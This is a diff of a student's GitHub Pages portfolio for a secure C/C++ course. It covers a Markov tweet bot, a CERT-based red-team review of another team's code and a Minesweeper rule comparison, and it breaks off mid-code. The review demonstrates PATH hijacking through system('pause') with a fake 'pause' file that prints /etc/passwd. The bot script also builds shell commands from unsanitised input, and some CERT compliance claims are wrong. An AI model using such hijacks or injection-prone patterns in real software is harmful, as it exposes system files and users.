@@ -1,44 +1,36 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en-us">
   <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta charset="UTF-8">
     <title>Secsoft.GitHub.io by secsoft</title>
-    <link rel="stylesheet" href="stylesheets/styles.css">
-    <link rel="stylesheet" href="stylesheets/github-dark.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
-    <script src="javascripts/main.js"></script>
-    <!--[if lt IE 9]>
-      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
-    <![endif]-->
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
   </head>
   <body>
+    <section class="page-header">
+      <h1 class="project-name">Secsoft.GitHub.io</h1>
+      <h2 class="project-tagline"></h2>
+    </section>
 
-      <header>
-        <h1>Secsoft.GitHub.io</h1>
-        <p></p>
-      </header>
-
-      <div id="banner">
-        <span id="logo"></span>
-
-        <a href="https://github.com/secsoft" class="button fork"><strong>View On GitHub</strong></a>
-      </div><!-- end banner -->
-
-    <div class="wrapper">
-      <nav>
-        <ul></ul>
-      </nav>
-      <section>
-        <h1>
+    <section class="main-content">
+      <h1>
 <a id="my-secure-software-milestones" class="anchor" href="#my-secure-software-milestones" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>My Secure Software Milestones</h1>
 
 <h3>
 <a id="background" class="anchor" href="#background" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Background</h3>
 
-<p>I took this course to improve my C and C++ programming skills with a strong emphasis on secure coding practices.  This page serves as an assessment of the many new abilities I have acquired and an outline to what I have accomplished through daily challenges and inspiring projects.  It reveals the journey of the great c</p>
+<p>I took this course to improve my C and C++ programming skills with a strong emphasis on secure coding practices.  This page serves as an assessment of the many new abilities I have acquired and an outline to what I have accomplished through daily challenges and inspiring projects.  It reveals the journey of hard work and dedication in producing secure software.</p>
+
+<h3>
+<a id="classes-structs-templates-the-stl" class="anchor" href="#classes-structs-templates-the-stl" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Classes, Structs, Templates, the STL</h3>
+
+<h4>
+<a id="summary" class="anchor" href="#summary" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Summary</h4>
+
+<p>In <a href="http://ss.prof.ninja/class7/">class 7</a>, we were presented with C++ templates, classes, and vector objects and C structs.  I have always been comfortable using classes and structs and usually avoided templates and vectors.  The daily challenges in this class required that we use all of these objects.  For the first time I began to feel more confident in dealing with vector objects.</p>
 
 <h3>
 <a id="markovian-tweets---a-twitter-bot-markov-sentence-generator" class="anchor" href="#markovian-tweets---a-twitter-bot-markov-sentence-generator" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Markovian-tweets - A Twitter Bot Markov Sentence Generator</h3>
@@ -46,38 +38,927 @@
 <h5>
 <a id="overview" class="anchor" href="#overview" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Overview</h5>
 
-<p>This project was designed to test our ability.  We were asked to develop an application that would consume a text file containing sentences and produce a tweet, using a markov model, in the style of the input text.  If we were able to complete this task and had we skills, then we were asked to add the ability of consuming a Twitter username, extracting a sample of that person's tweets, and generating a tweet in their style.  Then, if we made it this far, we were challenged to create a bot which accepts a username and tweets a message in that user's style.</p>
+<p>This project was designed to test our abilities.  We were asked to develop an application that would consume a text file containing sentences and produce a tweet, using a Markov model, in the style of the input text.  If we were able to complete this task and had we skills, then we were asked to add the ability of consuming a Twitter username, extracting a sample of that person's tweets, and generating a tweet in their style.  Then, if we made it this far, we were challenged to create a bot which accepts a username and tweets a message in that user's style.</p>
 
 <h5>
 <a id="accomplishments" class="anchor" href="#accomplishments" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Accomplishments</h5>
 
-<p>This automatic page generator is the easiest way to create beautiful pages for all of your projects. Author your page content here <a href="https://guides.github.com/features/mastering-markdown/">using GitHub Flavored Markdown</a>, select a template crafted by a designer, and publish. After your page is generated, you can check out the new <code>gh-pages</code> branch locally. If you’re using GitHub Desktop, simply sync your repository and you’ll see the new branch.</p>
+<p>Working together with a group, we were able to complete all levels of this project.  I wanted to improve my ability to create more functional shell based applications so I requested that we develop this project constricted to the console environment such that we would not use a web browser to capture and produce tweets.  My group accepted the challenge and discovered new techniques and tools along the way.<br>
+My first milestone was meet when I wanted to create a structure to store the words read from a text file into a Markov chain table.  Normally, I would have stored this data in a struct or class object because vector objects have always been intimidating for me.  This time; however, after our <a href="http://ss.prof.ninja/class7/">class 7</a> I felt very confident with vector objects and used that to store the Markov chain table and found this method to be quite similar to python dictionary objects.</p>
+
+<div class="highlight highlight-source-c++"><pre>   <span class="pl-c">// generate Markov chain table of fixed length</span>
+   map&lt; string, vector&lt; string &gt; &gt; map;
+
+   <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; words.size(); i++) {
+     <span class="pl-k">if</span> (i &lt; (words.<span class="pl-c1">size</span>() - chain_length)) {
+       <span class="pl-k">if</span> (chain_length == <span class="pl-c1">1</span>)
+         map[words[i]].<span class="pl-c1">push_back</span>(words[i+chain_length]);
+       <span class="pl-k">if</span> (chain_length == <span class="pl-c1">2</span>)
+         map[words[i]+<span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span>+words[i+<span class="pl-c1">1</span>]].<span class="pl-c1">push_back</span>(words[i+chain_length]);
+     }
+   }</pre></div>
+
+<p>Once we generated the Markov chain table, we were able to use it to produce Markovian sentences.  We added the ability for our C++ program to accept command line arguments so that we could pass parameters to our program from a shell script.  The next challange was to consume a twitter username, extract a sample of that user's tweets, and produce a tweet in their style.  To do this we used <code>wget</code> to get the id of a twitter account, <code>twurl</code> to obtain a sample of that user's tweets based on id, and our <code>markovchain</code> application to read in the tweets and produce a Markov generated tweet.  Then we added the <code>t</code> command to generate this tweet from our actual twitter account.  We put all of these commands in a ipython shell script called markovBot.ipy</p>
+
+<h5>
+<a id="markovbotipy" class="anchor" href="#markovbotipy" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>markovbot.ipy</h5>
+
+<div class="highlight highlight-source-python"><pre><span class="pl-k">import</span> json
+<span class="pl-k">import</span> sys
+
+username <span class="pl-k">=</span> sys.argv[<span class="pl-c1">1</span>]
+chain_length <span class="pl-k">=</span> sys.argv[<span class="pl-c1">2</span>]
+sentence_length <span class="pl-k">=</span> sys.argv[<span class="pl-c1">3</span>]
+
+cmd <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>wget "http://mytwitterid.com/api/index.php?screen_name=<span class="pl-pds">'</span></span> <span class="pl-k">+</span> username <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">'</span>" -O userid<span class="pl-pds">'</span></span>
+!<span class="pl-ii">$</span>cmd
+
+<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>userid<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> f:
+    data <span class="pl-k">=</span> f.read()
+    userid <span class="pl-k">=</span> json.loads(data)
+
+userid <span class="pl-k">=</span> userid[<span class="pl-c1">0</span>][<span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>]
+
+cmd <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>twurl <span class="pl-cce">\"</span>/1.1/statuses/user_timeline.json?user_id=<span class="pl-pds">'</span></span><span class="pl-k">+</span>userid<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">'</span>&amp;screen_name=<span class="pl-pds">'</span></span><span class="pl-k">+</span>username<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\"</span> &gt; tweets_src<span class="pl-pds">'</span></span>
+!<span class="pl-ii">$</span>cmd
+
+<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>tweets_src<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> f:
+    data <span class="pl-k">=</span> f.read()
+    the_tweets <span class="pl-k">=</span> json.loads(data)
+
+tweets <span class="pl-k">=</span> []
+<span class="pl-k">for</span> data <span class="pl-k">in</span> the_tweets:
+    tweet <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span>.join(data[<span class="pl-s"><span class="pl-pds">'</span>text<span class="pl-pds">'</span></span>].split()[<span class="pl-c1">1</span>:])
+    tweets.append(tweet)
+tweets <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\n</span><span class="pl-pds">'</span></span>.join(tweets).encode(<span class="pl-s"><span class="pl-pds">'</span>utf-8<span class="pl-pds">'</span></span>)
+
+<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>tweets<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>w<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> f:
+    f.write(tweets)
+
+cmd <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>./markovChain tweets <span class="pl-pds">'</span></span> <span class="pl-k">+</span> chain_length <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> <span class="pl-k">+</span> sentence_length
+out <span class="pl-k">=</span> !<span class="pl-ii">$</span>cmd
+
+<span class="pl-c1">print</span> out
+
+tweet <span class="pl-k">=</span> out[<span class="pl-c1">len</span>(out)<span class="pl-k">-</span><span class="pl-c1">1</span>].strip(<span class="pl-s"><span class="pl-pds">'</span>Sentence:<span class="pl-pds">'</span></span>)
+
+cmd <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>t update <span class="pl-cce">\"</span><span class="pl-pds">'</span></span> <span class="pl-k">+</span> tweet <span class="pl-k">+</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\"</span><span class="pl-pds">'</span></span>
+!<span class="pl-ii">$</span>cmd</pre></div>
+
+<p>A more detailed README and source code can be found here: <a href="https://github.com/kkatayama/markov_tweets">https://github.com/kkatayama/markov_tweets</a></p>
 
 <h3>
-<a id="command-minesweeper" class="anchor" href="#command-minesweeper" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Command Minesweeper</h3>
+<a id="markovian-tweets-red-team---hunt-for-exploits-and-weaknesses-from-the-sei-cert-c-coding-standard-andor-cert-c-coding-standard-found" class="anchor" href="#markovian-tweets-red-team---hunt-for-exploits-and-weaknesses-from-the-sei-cert-c-coding-standard-andor-cert-c-coding-standard-found" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Markovian-tweets (RED TEAM) - Hunt for exploits and weaknesses from the SEI CERT C Coding Standard and/or CERT C++ Coding Standard found</h3>
 
-<p>We’ve crafted some handsome templates for you to use. Go ahead and click 'Continue to layouts' to browse through them. You can easily go back to edit your page before publishing. After publishing your page, you can revisit the page generator and switch to another theme. Your Page content will be preserved.</p>
+<h5>
+<a id="overview-1" class="anchor" href="#overview-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Overview</h5>
+
+<p>This project introduced me to the CERT C++ Coding Standards.  We were asked to look at another groups Markov Sentence Generator and search for weaknesses, exploits, or proper protections that the developers used from the MEM and STR families of rules and recommendations. </p>
+
+<h5>
+<a id="results" class="anchor" href="#results" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Results</h5>
+
+<p>We examined the source code provided by team 14 and found some good and bad practices.  The source code and initial investigation is listed below, followed by a review with respect to the CERT C++ Coding Standard.<br>
+<strong>Please Note:</strong> as you will see in the source code provided, this program does not actually generate a markov sentence.  This application simply prints out the first two words provided in a sample text file and then randomly prints out words.</p>
+
+<h5>
+<a id="source-code" class="anchor" href="#source-code" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Source Code:</h5>
+
+<div class="highlight highlight-source-c++"><pre>#<span class="pl-k">define</span> <span class="pl-en">N</span> <span class="pl-c1">2</span>
+#<span class="pl-k">define</span> <span class="pl-en">MAX</span> <span class="pl-c1">10000</span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>iostream<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>string<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>deque<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>vector<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>map<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>ctime<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>sstream<span class="pl-pds">&gt;</span></span>
+#<span class="pl-k">include</span><span class="pl-s"><span class="pl-pds">&lt;</span>fstream<span class="pl-pds">&gt;</span></span>
+
+<span class="pl-k">using</span> <span class="pl-k">namespace</span> <span class="pl-en">std</span><span class="pl-k">;</span>
+
+<span class="pl-k">typedef</span> deque&lt;string&gt; Prefix;
+<span class="pl-k">typedef</span> vector&lt;string&gt; Postfix;
+<span class="pl-k">typedef</span> map&lt;Prefix, Postfix&gt; mapping_table;
+<span class="pl-k">char</span> fake_prefix[] = <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>;
+
+<span class="pl-k">void</span> <span class="pl-en">add_post</span>(Prefix &amp;pre, mapping_table &amp;tab, <span class="pl-k">const</span> string &amp;s)
+{   
+    <span class="pl-k">if</span> (pre.<span class="pl-c1">size</span>() == N)
+    {
+        tab[pre].<span class="pl-c1">push_back</span>(s);
+        pre.<span class="pl-c1">pop_front</span>();
+    }
+    pre.<span class="pl-c1">push_back</span>(s);
+
+}
+<span class="pl-k">void</span> <span class="pl-en">build_samp</span>(Prefix &amp;pre, mapping_table &amp;tab, istream &amp;in)
+{
+    string cur_word;
+    <span class="pl-k">while</span> (in &gt;&gt; cur_word)
+    {
+        <span class="pl-c1">add_post</span>(pre, tab, cur_word);
+    }
+}
+<span class="pl-k">void</span> <span class="pl-en">generate_sentence</span>( mapping_table &amp;tab)
+{
+    <span class="pl-c1">srand</span>(<span class="pl-c1">time</span>(<span class="pl-c1">NULL</span>));
+    Prefix prefix;
+    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; N; i++)
+    {
+        <span class="pl-c1">add_post</span>(prefix,tab,fake_prefix);
+    }
+    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; MAX; i++)
+    {
+        Postfix cur_post = tab[prefix];
+        <span class="pl-k">const</span> string &amp;w = cur_post[<span class="pl-c1">rand</span>() % cur_post.<span class="pl-c1">size</span>()];
+        <span class="pl-k">if</span> (w == <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>) <span class="pl-k">break</span>;
+        cout &lt;&lt; w&lt;&lt;<span class="pl-s"><span class="pl-pds">"</span> <span class="pl-pds">"</span></span>;
+        prefix.<span class="pl-c1">pop_front</span>();
+        prefix.<span class="pl-c1">push_back</span>(w);
+    }
+    cout &lt;&lt; endl;
+}
+<span class="pl-k">int</span> <span class="pl-en">main</span>()
+{
+    Prefix pre_;
+    mapping_table table_;
+    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; N; i++)
+    {
+        <span class="pl-c1">add_post</span>(pre_, table_, fake_prefix);
+    }
+    <span class="pl-c">//string sample_swntence = "my name is SongYang, my name is LiSiqi,my name is zuiniubi";</span>
+    string sample_sentence;
+    ifstream <span class="pl-smi">fin</span>(<span class="pl-s"><span class="pl-pds">"</span>sample.txt<span class="pl-pds">"</span></span>);
+    <span class="pl-k">if</span> (fin)
+    {
+        <span class="pl-c1">getline</span>(fin, sample_sentence);
+    }   
+    <span class="pl-k">else</span>
+    {
+        cout &lt;&lt; <span class="pl-s"><span class="pl-pds">"</span>can't find the file<span class="pl-pds">"</span></span>;
+    }
+    istringstream <span class="pl-smi">in</span>(sample_sentence);
+    <span class="pl-c1">build_samp</span>(pre_, table_, in);
+    <span class="pl-c1">add_post</span>(pre_, table_, fake_prefix);
+    <span class="pl-c1">generate_sentence</span>(table_);
+    <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">"</span>pause<span class="pl-pds">"</span></span>);
+    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
+}</pre></div>
+
+<h5>
+<a id="vulnerabilities" class="anchor" href="#vulnerabilities" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Vulnerabilities</h5>
+
+<ul>
+<li>
+<p>system()<br>
+In this markov code, there is a system function, this will cause potential secure risk.
+First, Calling "system" is literally like typing a command into the windows command prompt. There is a ton of setup and teardown for this application to make such a call - and the overhead is simply ridiculous.</p>
+
+<p>If a program called "pause" was placed into the user's PATH, just calling system("pause") only guarantees that a program called "pause" is executed.</p>
+
+<p>We should simply write our own "Pause()" function that uses _getch. Though _getch is platform dependent as well, but it's much nicer than system() if we are developing on Windows and it has the same effect </p>
+
+<p>Basically, we do not have to introduce so many potential problems while we can simply add two lines to make the same effect.</p>
+
+<p><strong>Potential Risk:</strong></p>
+
+<p>We can use system(“pause”) to jump to other program if we put an excutable program named “pause” under users’s path.</p>
+
+<p>So we decided to see if we could produce an exploit without modifying their code.  We simply created a file called ‘pause’ and added the following lines</p>
+
+<div class="highlight highlight-source-c++"><pre>  /bin/echo <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\n</span><span class="pl-pds">'</span></span>
+  /bin/cat /etc/passwd | egrep -v <span class="pl-s"><span class="pl-pds">'</span>_|#<span class="pl-pds">'</span></span></pre></div>
+
+<div class="highlight highlight-source-c++"><pre>$ ./main
+my name is LiSiqi,my name is LiSiqi,my name is LiSiqi,my name is LiSiqi,my name is zuiniubi
+
+
+nobody:*:-<span class="pl-c1">2</span>:-<span class="pl-c1">2</span>:Unprivileged User:/var/empty:/usr/bin/<span class="pl-c1">false</span>
+root:*:<span class="pl-c1">0</span>:<span class="pl-c1">0</span>:System Administrator:/var/root:/bin/sh
+daemon:*:<span class="pl-c1">1</span>:<span class="pl-c1">1</span>:System Services:/var/root:/usr/bin/<span class="pl-c1">false</span></pre></div>
+</li>
+<li>
+<p>rand()<br>
+The <code>rand()</code> function in C++ generates lower random number much more likely than large numbers, this will cause the program lose some randomness.</p>
+
+<p>Besides,  this function is not sufficiently random for security-related functions such as key and nonce creation.</p>
+</li>
+</ul>
+
+<h5>
+<a id="sei-cert-c-coding-standard" class="anchor" href="#sei-cert-c-coding-standard" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>SEI CERT C++ Coding Standard</h5>
+
+<ul>
+<li>
+<p>Violations:</p>
+
+<p>FIO51-CPP -  Close files when they are no longer needed they open the ‘sample.txt’ file using ifstream but never close (terminate) it</p>
+
+<p>DCL52-CPP - Never qualify a reference type with const or volatile
+line 45: <code>const string &amp;w = cur_post[rand() % cur_post.size()];</code></p>
+
+<p>This noncompliant code example correctly declares w to be a reference to a const-qualified char. The subsequent modification of w makes the program ill-formed and may result in undefined behavior instead of a fatal diagnostic, causing unexpected values to be stored and leading to possible data integrity violations.
+‘const’ should be removed</p>
+
+<p>ENV02-CPP - Do not call system() if you do not need a command processor
+line 76: <code>system("pause");</code>
+As shown in our investigation above, we were able to execute unintended shell code without modifying the source code</p>
+</li>
+<li>
+<p>Good Practice:</p>
+
+<p>DCL51-CPP - Do not declare or define a reserved identifier
+DCL51-CPP-EX1: For compatibility with other compiler vendors or language standard modes, it is acceptable to create a macro identifier that is the same as a reserved identifier so long as the behavior is semantically identical
+line 1: <code>#define N 2</code>
+line 2: <code>#define MAX 10000</code></p>
+
+<p>DCL52-CPP - Never qualify a reference type with const or volatile
+line 7: <code>void add_post(Prefix &amp;pre, mapping_table &amp;tab, const string &amp;s)</code>
+here s is a const that is never modified in this function - correct usage</p>
+</li>
+</ul>
 
 <h3>
-<a id="creating-pages-manually" class="anchor" href="#creating-pages-manually" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Creating pages manually</h3>
+<a id="command-line-minesweeper" class="anchor" href="#command-line-minesweeper" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Command-Line Minesweeper</h3>
 
-<p>If you prefer to not use the automatic generator, push a branch named <code>gh-pages</code> to your repository to create a page manually. In addition to supporting regular HTML content, GitHub Pages support Jekyll, a simple, blog aware static site generator. Jekyll makes it easy to create site-wide headers and footers without having to copy them across every page. It also offers intelligent blog support and other advanced templating features.</p>
+<h5>
+<a id="overview-2" class="anchor" href="#overview-2" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Overview</h5>
+
+<p>This project had two parts.  The first part was to create a console based Minesweeper game that would display a game board and accept user input for a coordinate where they could predict a mine does not exist.  If a mine was at that coordinate, then the game would exit, otherwise adjacent squares would be uncovered.  We were then asked to compare our code with ARR and EXP CERT rules.  For extra points we could add the ability to flag mines.  The second part involved exchanging our Minesweeper code with that of another group and document applications and violations of CERT rules in mSC and DCL.</p>
+
+<h5>
+<a id="accomplishments-1" class="anchor" href="#accomplishments-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Accomplishments</h5>
+
+<p>For part 1, our group was not only able to complete a functioning Minesweeper game, but also added the ability to flag mines.</p>
+
+<p>For part 2, this is the outcome of our head to head competition:</p>
+
+<h4>
+<a id="our-team-code" class="anchor" href="#our-team-code" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Our Team Code</h4>
+
+<p><a href="https://github.com/alparslansari/minesweeper-nogui">https://github.com/alparslansari/minesweeper-nogui</a></p>
+
+<h4>
+<a id="our-team-score-calculation-180-pts" class="anchor" href="#our-team-score-calculation-180-pts" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Our Team Score Calculation (180 pts)</h4>
+
+<h5>
+<a id="msc-points" class="anchor" href="#msc-points" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>MSC POINTS</h5>
+
+<ul>
+<li>  (+20pts) MSC50-CPP. Do not use std::rand() for generating pseudorandom numbers
+Our team uses srand() so we are compliant
+<code>cpp
+srand(time(0));
+</code>
+</li>
+<li>  (+20pts) MSC51-CPP. Ensure your random number generator is properly seeded
+Our code adjusts seed based on size of limit
+<code>cpp
+int rnd = 1 + rand() % limit;
+</code>
+</li>
+<li><p>(+20pts) MSC52-CPP. Value-returning functions must return a value from all exit paths
+Our functions return a value from all exit paths</p></li>
+<li><p>(0pts) MSC53-CPP. Do not return from a function declared [[noreturn]]
+Our code does not use functions decared [[noreturn]], therefore we are compliant</p></li>
+</ul>
+
+<h5>
+<a id="dcl-points" class="anchor" href="#dcl-points" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>DCL POINTS</h5>
+
+<ul>
+<li><p>(+20pts) DCL50-CPP. Do not define a C-style variadic function
+Our code does not define a C-style variadic function</p></li>
+<li>
+<p>(+20pts) DCL51-CPP. Do not declare or define a reserved identifier
+Compliant Header Guard</p>
+
+<div class="highlight highlight-source-c++"><pre>#<span class="pl-k">ifndef</span> VALIDATION_H
+#<span class="pl-k">define</span> <span class="pl-en">VALIDATION_H</span></pre></div>
+</li>
+<li>
+<p>(+20pts) DCL52-CPP. Never qualify a reference type with const or volatile</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-k">int</span> <span class="pl-k">const</span> Validation::MAX_WIDTH=<span class="pl-c1">100</span>;
+<span class="pl-k">int</span> <span class="pl-k">const</span> Validation::MAX_HEIGHT=<span class="pl-c1">40</span>;</pre></div>
+</li>
+<li>
+<p>(+20pts) DCL56-CPP. Avoid cycles during initialization of static objects
+Our code initializes variables</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-c">// initialize the board;</span>
+<span class="pl-k">for</span>(<span class="pl-k">int</span> i = <span class="pl-c1">1</span>; i&lt;=height; i++)
+  <span class="pl-k">for</span>(<span class="pl-k">int</span> j = <span class="pl-c1">1</span>; j&lt;=width; j++)
+  {
+     board[i][j] = -<span class="pl-c1">1</span>; <span class="pl-c">// empty squares</span>
+     boardMarkings[i][j] = -<span class="pl-c1">1</span>; <span class="pl-c">// </span>
+  }</pre></div>
+</li>
+<li>
+<p>(+20pts) DCL58-CPP. Do not modify the standard namespaces
+Our code does not modify standard namespaces</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-k">using</span> <span class="pl-k">namespace</span> <span class="pl-en">std</span><span class="pl-k">;</span></pre></div>
+</li>
+<li><p>(0pts) DCL59-CPP. Do not define an unnamed namespace in a header file
+Our code does not include a header file so this is satisfied</p></li>
+<li>
+<p>(+20pts) DCL60-CPP. Obey the One-Definition Rule
+Our code does not have multiple definitions with the same name</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-k">class</span> <span class="pl-en">Validation</span> {
+<span class="pl-k">public:</span>
+  <span class="pl-k">static</span> <span class="pl-k">int</span> <span class="pl-k">const</span> MAX_WIDTH;
+  <span class="pl-k">static</span> <span class="pl-k">int</span> <span class="pl-k">const</span> MAX_HEIGHT;
+  <span class="pl-k">bool</span> <span class="pl-en">isValidWidth</span>(<span class="pl-k">int</span> width);
+  <span class="pl-k">bool</span> <span class="pl-en">isValidHeight</span>(<span class="pl-k">int</span> height);
+  <span class="pl-k">bool</span> <span class="pl-en">isValidNumOfMines</span>(<span class="pl-k">int</span> width, <span class="pl-k">int</span> height, <span class="pl-k">int</span> mines);
+  <span class="pl-k">void</span> <span class="pl-en">printIntro</span>();
+  <span class="pl-k">int</span> <span class="pl-en">isValidateParamINT</span>(std::string param);
+  <span class="pl-k">int</span> <span class="pl-en">isCoordParamINT</span>(std::string param);
+  <span class="pl-k">bool</span> <span class="pl-en">isCoordinatesValid</span>(std::string x, std::string y, <span class="pl-k">int</span> width, <span class="pl-k">int</span>  height);
+};</pre></div>
+</li>
+</ul>
+
+<h4>
+<a id="opponent-code" class="anchor" href="#opponent-code" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Opponent Code</h4>
+
+<p><a href="https://github.com/samkossey/project_3_blue.git">https://github.com/samkossey/project_3_blue.git</a></p>
+
+<h4>
+<a id="opponent-score-calculation-140-pts" class="anchor" href="#opponent-score-calculation-140-pts" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Opponent Score Calculation (140 pts)</h4>
+
+<h5>
+<a id="msc-points-1" class="anchor" href="#msc-points-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>MSC POINTS</h5>
+
+<ul>
+<li>
+<p>(+20pts) MSC50-CPP. Do not use std::rand() for generating pseudorandom numbers
+code does not use rand() function</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-en">srand</span>(time(<span class="pl-c1">NULL</span>));</pre></div>
+</li>
+<li>
+<p>(+20pts) MSC51-CPP. Ensure your random number generator is properly seeded
+code generates number of pseudorandom numbers based on board size</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-en">srand</span>(time(<span class="pl-c1">NULL</span>));
+<span class="pl-k">int</span> bombsDropped=<span class="pl-c1">0</span>;
+<span class="pl-c">//drops bombs in order on board until no more remain</span>
+<span class="pl-k">for</span>(<span class="pl-k">int</span> i = <span class="pl-c1">0</span> ; i &lt; width; i++){
+    <span class="pl-k">for</span> (<span class="pl-k">int</span> j = <span class="pl-c1">0</span>; j &lt; height; j++){
+        <span class="pl-k">if</span>(bombsDropped &lt; bombs){
+            <span class="pl-k">if</span> (!(i == x &amp;&amp; j == y)){
+                aBoard[i][j].<span class="pl-c1">Bomb</span>();
+                bombsDropped++;
+            }
+        } <span class="pl-k">else</span> {
+            <span class="pl-k">break</span>;
+        }
+    }
+    <span class="pl-k">if</span>(bombsDropped &gt; bombs){
+        <span class="pl-k">break</span>;
+    }
+}</pre></div>
+</li>
+<li>  (+20pts) MSC52-CPP. Value-returning functions must return a value from all exit paths
+Their code returns a value from all exit paths</li>
+</ul>
+
+<h5>
+<a id="dcl-points-1" class="anchor" href="#dcl-points-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>DCL POINTS</h5>
+
+<ul>
+<li>
+<p>(+20pts) DCL57-CPP. Do not let exceptions escape from destructors or deallocation functions
+Their code has an explicit return statement to handle exceptions properly</p>
+
+<div class="highlight highlight-source-c++"><pre>} <span class="pl-k">catch</span> (invalid_argument <span class="pl-k">const</span> &amp;e){
+    cout &lt;&lt; <span class="pl-s"><span class="pl-pds">"</span>Argument Error: <span class="pl-pds">"</span></span> &lt;&lt; e.<span class="pl-c1">what</span>() &lt;&lt; endl;
+    <span class="pl-k">return</span> <span class="pl-c1">1</span>;
+} <span class="pl-k">catch</span> (bad_alloc <span class="pl-k">const</span> &amp;e){
